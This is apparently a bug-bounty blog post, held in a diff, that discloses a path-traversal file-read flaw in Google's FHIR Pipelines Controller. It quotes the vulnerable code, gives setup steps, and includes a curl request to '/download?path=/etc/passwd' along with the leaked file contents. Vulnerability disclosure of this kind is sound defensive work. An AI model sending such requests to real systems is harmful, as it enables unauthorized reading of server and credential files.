@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Google: Local File Inclusion in FHIR Pipelines Controller | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="Google: Local File Inclusion in FHIR Pipelines Controller" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Name" />
+<meta property="og:description" content="Name" />
+<link rel="canonical" href="http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" />
+<meta property="og:url" content="http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-05-16T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Google: Local File Inclusion in FHIR Pipelines Controller" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-05-16T10:31:06+08:00","datePublished":"2024-05-16T10:31:06+08:00","description":"Name","headline":"Google: Local File Inclusion in FHIR Pipelines Controller","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"},"url":"http://localhost:4000/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Google: Local File Inclusion in FHIR Pipelines Controller</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-05-16T10:31:06+08:00" itemprop="datePublished">May 16, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Local File Inclusion in FHIR Pipelines Controller</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>A local file inclusion is present in the FHIR Pipelines Controller when fetching error log file under the <code class="language-plaintext highlighter-rouge">/download?path=</code> route.</p>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">route</a> <code class="language-plaintext highlighter-rouge">/download</code> is used for fetching error log if <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L241">pipeline run failed</a>. However, the <code class="language-plaintext highlighter-rouge">path</code> parameter is not limited to <code class="language-plaintext highlighter-rouge">dwhRoot</code> folder causing any file on the filesystem can be read.</p>
+
+<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">spring boot rest controller</a> to download the log file:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@GetMapping(
+      value = "/download",
+      produces = {MediaType.TEXT_PLAIN_VALUE})
+public ResponseEntity&lt;InputStreamResource&gt; download(@RequestParam(name = "path") String path)
+      throws IOException {
+    ResourceId resourceId = FileSystems.matchNewResource(path, false);
+    ReadableByteChannel channel = FileSystems.open(resourceId);
+    InputStream stream = Channels.newInputStream(channel);
+    InputStreamResource inputStreamResource = new InputStreamResource(stream);
+    MultiValueMap&lt;String, String&gt; headers = new HttpHeaders();
+    headers.put("Content-type", Arrays.asList(MediaType.TEXT_PLAIN_VALUE));
+    return new ResponseEntity&lt;&gt;(inputStreamResource, headers, HttpStatus.OK);
+}
+</code></pre></div></div>
+
+<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L241">frontend view</a> to fetch log file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;div th:unless="${#strings.isEmpty(lastRunDetails.logFilePath)}"&gt;
+    Last run failed! Please find error logs here
+    &lt;button type="submit"
+            class="button btn btn-primary" th:onclick="openLogs([[${lastRunDetails.logFilePath}]])"&gt;
+        View Raw Logs
+    &lt;/button&gt;
+&lt;/div&gt;
+</code></pre></div></div>
+<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/resources/templates/index.html#L18">javascript function openLogs</a> to fetch the file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function openLogs(logPath) {
+    const url = "/download?path="+logPath;
+    // Encode the special characters in the url
+    const encodedURL = encodeURI(url);
+    window.open(encodedURL, '_blank').focus();
+}
+</code></pre></div></div>
+
+<p>The <a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/PipelineManager.java#L757">log file path</a> <code class="language-plaintext highlighter-rouge">logFilePath</code> is supposed to <code class="language-plaintext highlighter-rouge">dwhRoot + ERROR_FILE_NAME</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>String fileSeparator = DwhFiles.getFileSeparatorForDwhFiles(dwhRoot);
+dwhRoot = dwhRoot.endsWith(fileSeparator) ? dwhRoot : dwhRoot + fileSeparator;
+ResourceId errorResource = FileSystems.matchNewResource(dwhRoot + ERROR_FILE_NAME, false);
+if (dwhFilesManager.doesFileExist(errorResource)) {
+    dwhRunDetails.setLogFilePath(dwhRoot + ERROR_FILE_NAME);
+}
+</code></pre></div></div>
+
+<h3 id="steps-to-reproduce">Steps to reproduce</h3>
+
+<p>Following the official <a href="https://github.com/google/fhir-data-pipes/wiki/Try-out-the-FHIR-Pipelines-Controller#set-up-the-test-server">tutorial</a> to set up the HAPI FHIR server and the FHIR Pipelines Controller service:</p>
+
+<ol>
+  <li>
+    <p>Clone the fhir-data-pipes repository.</p>
+  </li>
+  <li>
+    <p>Set up a local HAPI FHIR server using docker:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> docker network create cloudbuild
+ docker-compose  -f ./docker/hapi-compose.yml up  --force-recreate -d
+</code></pre></div>    </div>
+    <p>The base URL for this server is http://localhost:8098/fhir.</p>
+  </li>
+  <li>
+    <p>Open <a href="https://github.com/google/fhir-data-pipes/blob/master/pipelines/controller/config/application.yaml">pipelines/controller/config/application.yml</a> in a text editor. Change <code class="language-plaintext highlighter-rouge">fhirServerUrl</code> to be:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> fhirServerUrl: "http://localhost:8091/fhir"
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Open <a href="https://github.com/google/fhir-data-pipes/blob/master/pipelines/controller/config/hapi-postgres-config.json">pipelines/controller/config/hapi-postgres-config.json</a>. Change <code class="language-plaintext highlighter-rouge">databaseHostName</code> to be:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "databaseHostName" : "localhost"
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Build the fhir-data-pipes service. In fhir-data-pipes root directory, run following:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cd fhir-data-pipes-master
+ mvn install -Dlicense.skip=true
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>After built successfully, <code class="language-plaintext highlighter-rouge">pipelines/controller/target/controller-bundled.jar</code> is generated. Run the server in <code class="language-plaintext highlighter-rouge">pipelines/controller/</code> directory:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cd pipelines/controller/
+ java -jar target/controller-bundled.jar
+</code></pre></div>    </div>
+    <p>After service up, the FHIR Pipelines Controller will listen on <code class="language-plaintext highlighter-rouge">http://0.0.0.0:8080</code>. Open the webpage <code class="language-plaintext highlighter-rouge">http://0.0.0.0:8080</code> in browser, We can see FHIR Pipelines Control Panel. Send following request to <code class="language-plaintext highlighter-rouge">/download</code> route:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> curl http://10.15.0.5:8080/download?path=/etc/passwd
+</code></pre></div>    </div>
+
+    <p>The output is the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> root:x:0:0:root:/root:/bin/bash
+ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+ bin:x:2:2:bin:/bin:/usr/sbin/nologin
+ sys:x:3:3:sys:/dev:/usr/sbin/nologin
+ sync:x:4:65534:sync:/bin:/bin/sync
+ games:x:5:60:games:/usr/games:/usr/sbin/nologin
+ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+ lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+ mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+ news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+ uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+ proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+ www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+ backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+ list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+ irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+ gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+ nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+ _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="impact">Impact</h2>
+
+<p>Any file on the backend filesystem can be read by an attacker with access to the FHIR Pipelines Controller service.</p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115</a></p>
+
+  </div><a class="u-url" href="/file-inclusion/2024/05/16/local-file-inclusion-in-fhir-pipelines-control.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
